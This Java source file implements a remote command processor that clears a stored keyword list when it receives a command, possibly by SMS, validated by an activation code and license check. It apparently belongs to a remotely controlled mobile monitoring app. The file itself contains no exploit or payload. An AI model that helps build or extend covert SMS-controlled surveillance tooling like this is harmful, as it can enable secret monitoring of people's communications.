package com.vvt.remotecommandmanager.processor.keywordlist;

import com.vvt.appcontext.AppContext;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.preference_manager.PrefKeyword;
import com.vvt.preference_manager.PreferenceManager;
import com.vvt.preference_manager.PreferenceType;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

public class ClearKeywordProcessor extends RemoteCommandProcessor {
	private static final String TAG = "ClearKeywordProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private PreferenceManager mPreferenceManager;
	private LicenseInfo mLicenseInfo;
	private StringBuilder mReplyMessageBuilder;
	
	public ClearKeywordProcessor(AppContext appContext, FxEventRepository eventRepository,
			LicenseInfo licenseInfo, PreferenceManager preferenceManager) {
		super(appContext, eventRepository);
		
		mLicenseInfo = licenseInfo;
		mReplyMessage = new ProcessingResult();
		mPreferenceManager = preferenceManager;
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.SYNC;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ...");
		mReplyMessageBuilder = new StringBuilder();
		
		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		try	 {
			PrefKeyword  keywordPreference = (PrefKeyword) mPreferenceManager.getPreference(PreferenceType.KEYWORD);
			if(LOGV) FxLog.v(TAG, "doProcessCommand # Before clear Keyword : "+keywordPreference.getKeyword().toString());
			keywordPreference.clearKeyword();
			if(LOGD) FxLog.d(TAG, "doProcessCommand # After clear Keyword : "+keywordPreference.getKeyword().toString());
			mPreferenceManager.savePreferenceAndNotifyChange(keywordPreference);
			
			mReplyMessage.setIsSuccess(true);
			mReplyMessageBuilder.append(MessageManager.CLEAR_KEYWORD_SUCCESS);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		catch(Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
			
			mReplyMessage.setIsSuccess(false);
			mReplyMessageBuilder.append(MessageManager.CLEAR_KEYWORD_ERROR);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ReplyMessage : "+mReplyMessage.getMessage());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT...");
	}

	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			//Command should only have 1 or 2 (<D>) arguments.
			if(commandData.getArguments().size() != 1) {
				throw new InvalidCommandFormatException();
			}
		
			//if invalid activation code it will throw exception.
			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		}
	}

	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}
}
